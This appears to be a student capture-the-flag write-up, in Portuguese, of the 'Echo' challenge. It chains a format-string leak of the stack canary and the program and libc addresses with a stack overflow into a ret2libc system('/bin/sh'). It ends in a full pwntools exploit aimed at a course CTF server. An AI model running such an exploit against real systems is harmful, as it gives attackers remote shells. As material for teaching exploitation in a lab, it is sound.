# Echo

  Inicialmente, este desafio fornece 2 ficheiros: "program" e "libc.so.6". O programa principal parece comportar-se como o comando "echo" do linux, deixando-nos introduzir um nome que, supostamente, só pode ter 20 carateres e uma mensagem. Vamos começar por averiguar se estes campos sofrem de algum tipo de vulnerabilidade string format:
  
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/2dd6b9c2-d7f4-4f24-bbcf-1172252f13d8)
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/dcd8df38-203e-4018-b8bb-84158b25e450)
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/18ff133a-f6be-4656-b3b5-2c339b3440e0)

  Ao que parece, apenas o campo do nome é vulnerável a string format, não parecendo existir problemas no campo da mensagem. Porém, este não parece ser o único problema do programa. Na segunda imagem conseguimos ver que o campo do nome não está limitado a 20 carateres, mas sim a 99 + 1 (99 chars + '\0'), e, quando são inseridos 20 ou mais carateres, o programa parece deixar de funcionar corretamente (imagem 3).
  
  Antes de prosseguir, vamos ver que medidas de segurança estão ativas no programa:
  
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/4d2f2f33-1f3e-48d7-a088-84c16cb93e16)

  Pelos vistos temos proteção máxima. Isso explicaria o fenómeno anterior: quando são inseridos 20 ou mais carateres, o programa deve estar a dar overwrite aos canários, causando stack smashing e interrompendo as funções normais do programa. Para além disso, a possibilidade de fazer um ataque semelhante ao do Final Format foi descartada devido a existir Full RELRO, incapacitando um GOT (Global Offset Table) overwrite, restando-nos ROP (Return Oriented Programming).
  
  Dadas as nossas hipóteses, vamos agora dividir o nosso esquema em passos para ser mais fácil de seguir:

## 1. Debugging

  O primeiro passo e mais importante é debug. Tendo em conta as restrições que vimos anteriormente, vamos começar por entender como é o layout da memória virtual do programa, já que esta pode variar a cada execução devido ao PIE estar ligado:
  
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/ab63c395-3f8b-485e-9215-fedbfb009546)
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/1b82e2c1-076f-4b18-9797-336f7ec22e82)
  (Nota: Deve-se iniciar o gdb com a opção LD_LIBRARY_PATH=$PWD para podermos usar "libc.so.6" em vez da biblioteca guardada no sistema)
  
  Apesar de não ser percetível pelas imagens, o programa começa a ser executado em 0x56555000 e acaba em 0x5655a000. Já a libc ocupa os endereços 0xf7d94000 a 0xf7fbf000:
  
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/8098a5d1-b5cf-496f-9b7b-b70e30d54f97)
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/12a7d484-20b4-4805-9d5d-a4c3154ed382)

  Vamos agora recorrer a um site que já usámos no desafio de Final Format para visualizar o código de uma maneira mais legível e tentar entender o que se está a passar:
  
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/df483fda-971c-4813-9cba-6eeba9b0e76f)
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/5feac0d5-371e-40a4-9243-ccda6d6445d5)
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/358cf07b-a13a-4b82-80c9-ac128919c62a)

  Do código acima conseguimos observar detalhes interessantes: o nome é guardado para uma variável de tamanho 20, apesar de serem lidos 100 carateres e a mensagem é lida para um buffer com 100 carateres, sendo este buffer uma variável global. Tendo em conta estas informações, uma maneira de realizar este ataque seria substituir o return address na main para a função system, dando-lhe como argumento a shell que ficaria guardada na mensagem. Para isso precisaremos de lidar com o canário.
  
## 2. Canário

  Queremos descobrir o endereço do canário no momento em que o nome vai ser escrito, visto que este é o ponto onde vamos dar overflow. Para realizar esta e tarefas futuras, vamos usar uma versão mais avançada do gdb: o gef. Começemos então por localizar o canário:
  
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/a67ad1e5-73da-4e34-8a40-0bb4c549fc65)
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/25da9190-1b6d-4f0a-bdc4-152d58a9cd7e)
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/478f1353-3306-43b3-9352-be58df2eca24)

  Ao dar break e avançar para o segundo printf, parámos imediatamente antes do pedido pelo nome. Neste instante, conseguimos ver que o canário toma o valor 0xce574100 no endereço 0xffffd190, o que significa que +0x0020 / 4 = 32/4 = 8 -> %8$x é o valor ideal para expor o valor do canário. Com o endereço do canário descoberto, podemos prosseguir para a mudança do return address.
  
## 3. Return

  Como vamos querer dar return para a função system(), precisamos de descobrir o seu endereço em memória primeiro. Para tal, podemos recorrer ao comando "readelf -s libc.so.6 | grep system":
  
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/d8b889fb-0eea-4c7f-8b92-de28e50bf3b0)

  Do resultado acima, concluímos que a função localiza-se a um offset de 48150 do início da libc. Porém, ainda precisamos de saber a localização do endereço base da libc. Como o PIE está ligado, este endereço estará sempre a variar. Para saber a sua localização, podemos tirar proveito do break para o printf do nome que usámos anteriormente:
  
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/fcc00690-eb2f-4fab-b236-1e4abfae8a12)

  Esta imagem é semelhante à do printf que usámos anteriormente. Podemos ver que o valor de $ebp situa-se a um offset de +0x0028, revelando assim que o return situa-se a um offset de +0x002c quando o programa chega ao printf. O formatador a usar será %11$x. Quanto ao offset, temos apenas que calcular a distância entre o endereço base da libc e o printf (0xf7de4ee5 - 0xf7dca000 = 0x0001aee5).
  
  Precisamos agora do endereço do buffer para passar a shell como argumento à função system(). Para isso, vamos precisar do endereço base da main, que pode ser obtido pelo seu offset:
  
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/52f505af-ff19-487f-a521-918fbe90ade3)

  Pela imagem, conseguimos ver que a main situa-se a um offset de +0x00a0 da printf do nome, sendo assim possível ir buscar o seu endereço a %40$x. Adicionalmente, como sabemos, neste caso, que o endereço base da main é 0x56555000, uma simples conta que descobre o seu offset seria 0x565562ad - 0x56555000 = 0x000012AD. Com isto, temos a localização do endereço base.
  
## 4. Organização

  Com todos os valores calculados, vejamos a organização necessária:
  
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/cdf2e30a-f4be-4500-967c-d85efafca1d4)

  Como os valores vão ser escritos têm que ser relativos à localização do buffer do nome (0xffffd15c), vemos que, neste instante, temos que alterar o valor do return no offset +0x0020 (32 bytes), inserir o argumento para a função system a +0x0024 (36 bytes) e manter o valor do canário inalterado a +0x0014 (20 bytes).
  
## 5. Exploit

  Só resta reunir tudo num script python e testar:
  
    from pwn import *

    def leak_canary(proc):
        payload = b"%8$x"
        proc.sendlineafter(b">", b"e")
        proc.sendlineafter(b":", payload)
        canary = proc.recvline(keepends=False)
        proc.sendlineafter(b":", b"")
        return int(canary, 16)

    def leak_main_addr(proc):
        payload = b"%17$x"
        proc.sendlineafter(b">", b"e")
        proc.sendlineafter(b":", payload)
        addr = proc.recvline(keepends=False)
        proc.sendlineafter(b":", b"")
        return int(addr, 16)

    def leak_libc_addr(proc):
        payload = b"%11$x"
        proc.sendlineafter(b">", b"e")
        proc.sendlineafter(b":", payload)
        addr = proc.recvline(keepends=False)
        proc.sendlineafter(b":", b"")
        return int(addr, 16)

    program = ELF("./program")
    libc = ELF("./libc.so.6")

    r = remote("ctf-sp.dcc.fc.up.pt", 4002)

    canary = leak_canary(r)
    info(f"Canary leaked!\n! {hex(canary)}")

    main_addr = leak_main_addr(r)
    program_base_addr = main_addr - program.symbols["main"]
    info(f"Program base address leaked!\n! {hex(program_base_addr)}")
    buffer_addr = program_base_addr + program.symbols["buffer"]

    libc_addr = leak_libc_addr(r)
    libc_base_addr = libc_addr - 0x00021519 # value obtained using GDB

    info(f"Libc base address leaked!\n! {hex(libc_base_addr)}")
    system_addr = libc_base_addr + libc.symbols["system"]

    info(f"Ret addr: {hex(system_addr)}")
    info(f"Ret arg addr: {hex(buffer_addr)}")

    payload = b"A" * 20 + p32(canary) + b"\0" * 8 + p32(system_addr) + b"\0" * 4 + p32(buffer_addr)
    info(f"Payload: {payload}")

    r.sendlineafter(b">", b"e")
    r.sendlineafter(b":", payload)
    r.sendlineafter(b":", b"/bin/sh\0")
    r.sendlineafter(b">", b"q")

    r.interactive()
    
  (Nota: Foram feitas 2 correções a valores que não tinham sido devidamente calculados. Foram usados na mesma os métodos descritos acima)
  
  ![imagem](https://github.com/DCC-FCUP-SP/sp2223-t01g03/assets/126570489/b439376d-9b73-4fea-8bb7-4a3f33c7cd8c)
